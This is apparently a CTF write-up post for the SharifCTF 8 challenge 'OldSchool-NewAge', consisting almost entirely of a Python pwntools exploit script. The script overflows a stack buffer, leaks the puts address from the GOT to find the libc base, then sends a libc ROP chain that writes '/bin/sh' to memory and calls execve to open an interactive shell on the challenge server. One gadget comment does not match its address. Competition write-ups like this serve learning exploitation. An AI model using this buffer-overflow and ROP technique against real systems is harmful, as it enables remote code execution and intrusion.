---
layout: post
title: SharifCTF 8 - OldSchool-NewAge
categories: ctf_sharifctf18
keywords: "exploitation"
comments: true
authors:
    - andreafioraldi
---
{{ page.date | date: "%B %-d, %Y" }}

```python
#TheRomanXpl0it - andreafioraldi

from pwn import *
import sys

#########################################################
BINARY="./vuln4"
HOST="ctf.sharif.edu"
PORT=4801
ENV={"LD_PRELOAD":"./libc.so.6"}
GDB=""
#########################################################

if len(sys.argv) < 2:
    print "args: bin|net|ida|gdb\n"
    sys.exit(1)

if sys.argv[1] == "bin":
    p = process(BINARY, env=ENV)
elif sys.argv[1] == "net":
    p = remote(HOST, PORT)
elif sys.argv[1] == "ida":
    p = process("./linux_server64", env=ENV)
    p.recvuntil("0.1...")
elif sys.argv[1] == "gdb":
    p = process(BINARY, env=ENV)
    gdb.attach(p, GDB)
else:
    print "args: bin|net|ida|gdb\n"
    sys.exit(1)

libc_elf = ELF("libc.so.6")

print p.recvuntil("yourself\n")

#### PHASE 1 - LEAK THE PUTS ADDRESS FROM THE GOT AND RESTART ####

puts_got = 0x08049874
puts_plt = 0x080483A0

new_ebp = 0x08049990 #RW memory because the buffer is read in [ebp-3Ah]

rop = ""
rop += p32(0x08048513) #main+41
rop += p32(puts_got)

#jump to 'call _puts' to print the puts address and read another buffer
p.sendline(18*"a" + p32(new_ebp) + rop)

r = p.recvline()[:4]
puts = u32(r)

libc_address = puts - libc_elf.symbols["_IO_puts"]# libc.so.6
print " >> libc addr: " + hex(libc_address)

#### PHASE 2 - BUILD A ROPCHAIN WITH LIBC GADGETS AND WIN ####

rebase_0 = lambda x : p32(x + libc_address)

rop = '' #generated with ropper
rop += rebase_0(0x0002406e) # 0x0002406e: pop eax; ret; 
rop += '//bi'
rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret; 
rop += rebase_0(0x001b3040)
rop += rebase_0(0x0018e372) # 0x0018e372: mov dword ptr [ecx], eax; ret; 
rop += rebase_0(0x0002406e) # 0x0002406e: pop eax; ret; 
rop += 'n/sh'
rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret; 
rop += rebase_0(0x001b3044)
rop += rebase_0(0x0018e372) # 0x0018e372: mov dword ptr [ecx], eax; ret; 
rop += rebase_0(0x0002c79c) # 0x0002c79c: xor eax, eax; ret; 
rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret; 
rop += rebase_0(0x001b3048)
rop += rebase_0(0x0018e372) # 0x0018e372: mov dword ptr [ecx], eax; ret; 
rop += rebase_0(0x00018395) # 0x00018395: pop ebx; ret; 
rop += rebase_0(0x001b3040)
rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret; 
rop += rebase_0(0x001b3048)
rop += rebase_0(0x00001aa6) # 0x00001aa6: pop edx; ret; 
rop += rebase_0(0x001b3048)
rop += rebase_0(0x0002c79c) # 0x0002c79c: xor eax, eax; ret;  
rop += rebase_0(0x0013fd80) # 0x0013fd80: add eax, 9 ; ret
rop += rebase_0(0x000a0567) # 0x000a0580: add eax, 2 ; ret
rop += rebase_0(0x00002c87) # 0x00002c87: int 0x80; 

if rop.find("\0") != -1: #highly unlikely
    print " >> byte 0 in the payload.\n >> retry to run the exploit."
    sys.exit(1)

p.sendline(22*"a" + rop)

p.interactive()

```





